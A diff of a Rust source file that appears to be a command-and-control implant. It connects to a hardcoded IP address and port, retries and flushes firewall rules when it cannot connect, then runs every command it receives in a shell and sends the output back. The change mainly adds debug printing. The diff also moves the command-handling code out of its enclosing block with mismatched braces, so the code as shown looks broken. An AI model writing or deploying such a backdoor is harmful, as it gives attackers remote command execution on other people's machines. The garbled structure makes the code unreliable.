@@ -12,13 +12,11 @@ use wait_timeout::ChildExt;
 use std::time::Duration;
 use std::io::Read;
 
-//TODO 
-//Implement multiple IP addresses and ports (eventually connect to the router)
-//Refactor
-
 fn connect(ip: &str) -> TcpStream {
+    print_debug("Inside connect function");
     let mut x = 0;
     loop {
+        print_debug("Trying to connect...");
         if x > 24{ //if after 2 minutes of no connecting, drop IP tables
             x = 0;
             if cfg!(windows){
@@ -31,11 +29,13 @@ fn connect(ip: &str) -> TcpStream {
         } 
         match TcpStream::connect(ip){ //try to connect to the IP
             Ok(con) => { //if it worked, return the connection
+                print_debug("Successfully Connected!");
                 return con;
             },
             Err(_) => { //if it errored, re-loop
                 thread::sleep(time::Duration::from_millis(5000));
                 x+=1;
+                print_debug("Did not connect. Waiting 5 seconds.");
                 continue;
             }
         } 
@@ -84,53 +84,61 @@ fn run_command(cmd: &str) -> String {
 fn c2(ip:&str) -> bool {
     let mut stream = connect(ip); //connects via TCP
     loop {
+        print_debug("Inside main loop of C2");
         let mut buffer = [0;1024]; //set the buffer
+        print_debug("Reading buffer...");
         let num_of_bytes = stream.read(&mut buffer).unwrap_or(0); //if it fails, make the buffer 0
+        print_debug("Buffer read successfully");
         if num_of_bytes == 0 { //if the connection is lost
             thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds 
             stream = connect(ip); //connect again
+            print_debug("Connection lost... Resetting");
             continue; //continue the loop
         }
         let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
+        print_debug("Received Msg: ");
+        print_debug(&recv);
         if recv.contains("getIP") { //if it's getIP, return the IP
-            let local_ip = local_ip().unwrap(); //get the local IP
-            let local_ip = format!("{}\n",local_ip); //format IP into string
-            let local_ip = local_ip.as_bytes();
-            stream.write(&local_ip).unwrap(); //send it
-            continue;
-        }
-        if recv.len() > 2{
-            if recv[..=1].eq("cd") { //if the first two letters are cd
-                let path = Path::new(&recv[3..]); //the path is the remaining
-                stream.write(match set_current_dir(path) { //write to the stream the current diretory after changing it
-                    Ok(_) => { //if ok, return current directory
-                        let cmd_out = if cfg!(windows) {
-                            Command::new("powershell").arg("-command").arg("cd").output().unwrap()
-                        } else {
-                            Command::new("sh").arg("-c").arg("pwd").output().unwrap()
-                        };
-                        format!("Current Directory: {}", std::str::from_utf8(&cmd_out.stdout).unwrap())
-                    }
-                    Err(err) => {
-                        format!("{}", err)
-                    }
-                }.as_bytes(),).unwrap();
-                continue;
-            } else if recv.eq("beacon_ping"){
-                stream.write(b"beacon_pong").unwrap();
-                continue;
-            } else if recv.eq("ENDCONNECTION"){
-                return false;
-            }
-        }
-        let output = run_command(&recv); //run this
-        stream.write(&output.as_bytes()).unwrap(); //send that shit
+        let local_ip = local_ip().unwrap(); //get the local IP
+        let local_ip = format!("{}\n",local_ip); //format IP into string
+        let local_ip = local_ip.as_bytes();
+        stream.write(&local_ip).unwrap(); //send it
+        continue;
     }
+    if recv.len() > 2{
+        if recv[..=1].eq("cd") { //if the first two letters are cd
+            let path = Path::new(&recv[3..]); //the path is the remaining
+            stream.write(match set_current_dir(path) { //write to the stream the current diretory after changing it
+                Ok(_) => { //if ok, return current directory
+                    let cmd_out = if cfg!(windows) {
+                        Command::new("powershell").arg("-command").arg("cd").output().unwrap()
+                    } else {
+                        Command::new("sh").arg("-c").arg("pwd").output().unwrap()
+                    };
+                    format!("Current Directory: {}", std::str::from_utf8(&cmd_out.stdout).unwrap())
+                }
+                Err(err) => {
+                    format!("{}", err)
+                }
+            }.as_bytes(),).unwrap();
+            continue;
+        } else if recv.eq("beacon_ping"){
+            stream.write(b"beacon_pong").unwrap();
+            continue;
+        } else if recv.eq("ENDCONNECTION"){
+            return false;
+        }
+    }
+    let output = run_command(&recv); //run this
+    print_debug("Command Output: ");
+    print_debug(&output);
+    stream.write(&output.as_bytes()).unwrap(); //send that shit
+}
 }
 
 // //function to check-in with the server every minute. if it can't connect, the client will try other methods to connect
 // fn check_in(){
-//     thread::spawn(|| {
+    //     thread::spawn(|| {
 //         loop{
 //             thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds
 //             // println!("{}","checking in!");
@@ -153,12 +161,20 @@ fn constant_checker(){
     });
 }
 
+fn print_debug(msg:&str){
+    let print_bool = true;
+    if print_bool{
+        println!("[DEBUG] - {}",msg);
+    }
+}
 
 fn main(){
     let ip = "129.21.49.57:9876";
-    connect_to_router();
+    // connect_to_router();
     loop{
+        print_debug("Inside main loop.");
         if !c2(&ip){
+            print_debug("'ENDCONNECTION' received. Closing client.");
             break
         };
     }
